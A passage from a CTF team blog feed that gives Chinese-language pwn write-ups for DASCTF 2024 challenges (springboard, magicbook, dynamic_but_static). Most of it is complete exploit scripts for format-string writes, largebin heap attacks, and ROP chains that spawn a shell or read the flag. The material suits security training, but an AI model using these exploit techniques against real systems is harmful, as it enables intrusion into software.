class="hljs-built_in">hex</span>(libc.address + <span class="hljs-number">0x53B2E</span>))<br>    log.success(<span class="hljs-string">&quot;addr:&quot;</span>+<span class="hljs-built_in">hex</span>(target_heap+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x250</span>))<br><br><br>    pause()<br>    exit()<br>    <br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>    log.success(<span class="hljs-string">&#x27;io_list_all:&#x27;</span>+<span class="hljs-built_in">hex</span>(io_list_all))<br>    log.success(<span class="hljs-string">&#x27;_IO_wfile_jumps:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF 2024暑期挑战赛</title>
    <link href="/2024/07/21/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/21/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>(没打,结束了才去看了题)</p><h1 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h1><p>非栈上的格式化字符串</p><p>格式</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">%Yc</span><span class="hljs-built_in">%X</span><span class="hljs-built_in">$n</span><br></code></pre></td></tr></table></figure><p>将Y写入栈上第X个位置指针指向的位置</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x50a47</span> posix_spawn(<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x1c</span>, <span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x60</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  <span class="hljs-built_in">rsp</span> &amp; <span class="hljs-number">0xf</span> == <span class="hljs-number">0</span><br>  <span class="hljs-built_in">rcx</span> == NULL<br>  <span class="hljs-built_in">rbp</span> == NULL || (u16)[<span class="hljs-built_in">rbp</span>] == NULL<br><br><span class="hljs-number">0xebc81</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span>])<br><span class="hljs-symbol">constraints:</span><br>  address <span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x78</span> is writable<br>  [<span class="hljs-built_in">r10</span>] == NULL || <span class="hljs-built_in">r10</span> == NULL<br>  [[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span>]] == NULL || [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span>] == NULL<br><br><span class="hljs-number">0xebc85</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rdx</span>)<br><span class="hljs-symbol">constraints:</span><br>  address <span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x78</span> is writable<br>  [<span class="hljs-built_in">r10</span>] == NULL || <span class="hljs-built_in">r10</span> == NULL<br>  [<span class="hljs-built_in">rdx</span>] == NULL || <span class="hljs-built_in">rdx</span> == NULL<br><br><span class="hljs-number">0xebc88</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rdx</span>)<br><span class="hljs-symbol">constraints:</span><br>  address <span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x78</span> is writable<br>  [<span class="hljs-built_in">rsi</span>] == NULL || <span class="hljs-built_in">rsi</span> == NULL<br>  [<span class="hljs-built_in">rdx</span>] == NULL || <span class="hljs-built_in">rdx</span> == NULL<br></code></pre></td></tr></table></figure><p>利用栈上的两条链来改写rbp以及返回地址,使满足one_gadget的要求</p><p>(懒得patch)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./rlibc.so.6&quot;)</span><br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>onegadget = [<span class="hljs-number">0xebc85</span>]<br>bss = <span class="hljs-number">0x601800</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s_</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;Please enter a keyword&quot;</span>,c)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br><br>    pleak = <span class="hljs-string">b&#x27;%3$p,%13$p&#x27;</span><br>    s_(pleak)<br>    ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>    libc.address = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x7fe8ea38b7e2</span>+<span class="hljs-number">0x7fe8ea277000</span><br>    ru(<span class="hljs-string">&#x27;,0x&#x27;</span>)<br>    stack = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x7fff9b06e258</span>+<span class="hljs-number">0x7fff9b06e130</span><br>    <br>    p1 = <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((stack+<span class="hljs-number">0x18</span>)&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-string">&#x27;c%13$hn&#x27;</span><br>    p1 += <span class="hljs-string">&#x27;%c1%31$hn&#x27;</span><br>    s_(p1)<br><br>    one = libc.address + onegadget[<span class="hljs-number">0</span>]<br>    a = one &amp; <span class="hljs-number">0xffff</span><br>    b = (one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(b),<span class="hljs-built_in">hex</span>(a))<br>    p = <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(b)+<span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br>    p += <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a-b)+<span class="hljs-string">&#x27;c%43$hn&#x27;</span><br>    s_(p)<br><br>    p2 = <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((stack+<span class="hljs-number">0x10</span>)&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-string">&#x27;c%13$hn&#x27;</span><br>    p2 += <span class="hljs-string">&#x27;%c1%31$hn&#x27;</span><br>    s_(p2)<br><br>    a = bss &amp; <span class="hljs-number">0xffff</span><br>    b = (bss&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(b),<span class="hljs-built_in">hex</span>(a))<br>    p = <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(b)+<span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br>    p += <span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a-b)+<span class="hljs-string">&#x27;c%43$hn&#x27;</span><br>    s_(p)<br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h1 id="magicbook"><a href="#magicbook" class="headerlink" title="magicbook"></a>magicbook</h1><p>libc为2.35</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./rlibc.so.6&quot;)</span><br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;How many pages does your book need?&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx,choice=<span class="hljs-number">0</span>,idx_=<span class="hljs-number">0</span>,data=<span class="hljs-string">&quot;&quot;</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;which book would you want to delete?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    c = <span class="hljs-string">&#x27;N&#x27;</span><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span> :<br>        c = <span class="hljs-string">&#x27;Y&#x27;</span><br>    sa(<span class="hljs-string">&quot;Do you want to say anything else before being deleted?(y/n)&quot;</span>,c)<br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    sla(<span class="hljs-string">&quot;which page do you want to write?&quot;</span>,<span class="hljs-built_in">str</span>(idx_))<br>    sa(<span class="hljs-string">&quot;content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sa(<span class="hljs-string">&quot;come on,Write down your story!&quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">data</span>):<br>    sa(<span class="hljs-string">&quot;come on,Write down your story!&quot;</span>,data)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;give you a gift: &#x27;</span>)<br>    elf.address = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x5642f87e1010</span>+<span class="hljs-number">0x5642f87dd000</span><br>    add(<span class="hljs-number">0x428</span>)<span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x418</span>)<span class="hljs-comment">#2</span><br>    free(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0x438</span>)<span class="hljs-comment">#3</span><br>    free(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,p64_ex(elf.address + <span class="hljs-number">0x4050</span>-<span class="hljs-number">0x20</span>)*<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0x438</span>)<span class="hljs-comment">#4</span><br><br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">True</span>,find_in_libc=<span class="hljs-literal">False</span>)<br>    p1 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p64_ex(CG.ret())+p64_ex(CG.pop_rdi_ret())+p64_ex(elf.got.puts)+p64_ex(elf.plt.puts)+p64_ex(elf.sym.edit_the_book)<br>    edit(p1)<br><br>    libc.address = recv_libc_addr(io) - libc.sym.puts<br>    <br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">True</span>,find_in_libc=<span class="hljs-literal">True</span>)<br><br>    p2 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p64_ex(CG.ret())+p64_ex(CG.pop_rdi_ret())+p64_ex(elf.address + <span class="hljs-number">0x4088</span>)+p64_ex(elf.plt.puts)+p64_ex(elf.sym.edit_the_book)<br>    do(p2)<br><br>    ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    heap_base = u64_ex(io.recv(<span class="hljs-number">6</span>))-<span class="hljs-number">0x557c29854fb0</span>+<span class="hljs-number">0x557c29854000</span><br><br>    dest = heap_base + <span class="hljs-number">0x557c29854fa0</span> - <span class="hljs-number">0x557c29854000</span> + <span class="hljs-number">0x10</span><br><br>    p3 = <span class="hljs-string">b&#x27;./flag&#x27;</span><br>    p3 = p3.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p3 += CG.orw_chain(dest,dest+<span class="hljs-number">0x3000</span>)<br><br>    do(p3)<br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address: &#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;heap_base: &#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>    log.success(<span class="hljs-string">&#x27;dest: &#x27;</span>+<span class="hljs-built_in">hex</span>(dest))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h1 id="vhttp"><a href="#vhttp" class="headerlink" title="vhttp"></a>vhttp</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buu</tag>
      
      <tag>das</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2024｜四月开启第一局</title>
    <link href="/2024/05/03/DASCTF%20X%20GFCTF%202024/"/>
    <url>/2024/05/03/DASCTF%20X%20GFCTF%202024/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="dynamic-but-static"><a href="#dynamic-but-static" class="headerlink" title="dynamic_but_static"></a>dynamic_but_static</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>setbuf_got = elf.got[<span class="hljs-string">&#x27;setbuf&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x401381</span><br>ret = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x401349</span><br>main = <span class="hljs-number">0x40134B</span><br>flag_addr = <span class="hljs-number">0x404200</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #remote</span><br>libc_pop_rsi = <span class="hljs-number">0x2be51</span><br>libc_pop_rdx = <span class="hljs-number">0x796a2</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LLCC&#x27;</span>)<br>    p1=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(pop_rdi)+p64(setbuf_got)+p64(puts_plt)<br>    p1+=p64(main)<br>    s(p1)<br>    read_addr = recv_libc_addr(io)<br>    libc.address = read_addr - libc.sym[<span class="hljs-string">&#x27;setbuf&#x27;</span>]<br>    pop_rsi = libc_pop_rsi + libc.address<br>    pop_rdx = libc_pop_rdx + libc.address<br>    write_addr = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    open_addr = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br><br><br>    p=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(flag_addr)<br>    p+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(<span class="hljs-number">0x300</span>)+p64(read_plt)+p64(leave)<br>    sleep(<span class="hljs-number">0.3</span>)<br>    sl(p)<br>    orw = <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>+CG.orw_chain(flag_addr,flag_addr+<span class="hljs-number">0x30</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)<br>    sl(orw)<br><br>    <br><br><span class="hljs-comment">#log</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;flag_addr:&#x27;</span>+<span class="hljs-built_in">hex</span>(flag_addr))<br>    <span class="hljs-comment">#log.success(&#x27;heap_base:&#x27;+hex(heap_base))</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    attack()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h2><p><a href="https://xz.aliyun.com/t/12967?time__1311=mqmhqIx+ODkKDsD7G30=3eAKdDvzTqvpD&amp;alichlgref=https://xz.aliyun.com/t/12967#toc-2">https://xz.aliyun.com/t/12967?time__1311=mqmhqIx%2BODkKDsD7G30%3D3eAKdDvzTqvpD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12967#toc-2</a></p><p>Linux下的C++对应的异常处理，也就是对基于eh_frame进行unwind的异常处理流程的攻击手法的研究</p><p>异常处理时从<code>__cxa_throw()</code>时开始，之后进行unwind, cleanup, 